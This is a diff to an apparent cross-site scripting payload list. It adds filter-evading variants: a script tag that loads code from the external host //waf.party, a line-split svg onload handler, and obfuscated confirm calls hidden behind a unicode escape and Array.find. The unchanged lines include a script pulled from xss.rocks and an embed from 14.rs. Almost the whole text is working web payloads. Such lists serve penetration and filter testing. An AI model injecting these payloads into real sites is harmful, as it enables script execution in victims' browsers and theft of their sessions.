@@ -9,6 +9,7 @@ Just a bunch of XSS payloads.
 
 ## SCRIPT
 ```
+<script src=//waf.party></script>
 <script/a> alert(1) </script/a>
 <SCRIPT/a SRC=http://xss.rocks/xss.js></SCRIPT/a>
 <script>(alert)(1)</script>
@@ -27,6 +28,8 @@ Just a bunch of XSS payloads.
 ## SVG
 ```
 <svg/onload=alert(1)>
+<svg
+onload=alert(1)>
 <svg // onload = alert(1)>
 <svg/onload=prompt(1)>
 <svg/onload=top["alert"](1)>
@@ -53,6 +56,8 @@ Just a bunch of XSS payloads.
 <x onclick=alert(1)>click this!
 <plaintext/onmouseover=prompt(1)>
 <embed src=//14.rs>
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<d3/onmouseenter=[2].find(confirm)>z
 ```
 
 ## HTML 5 
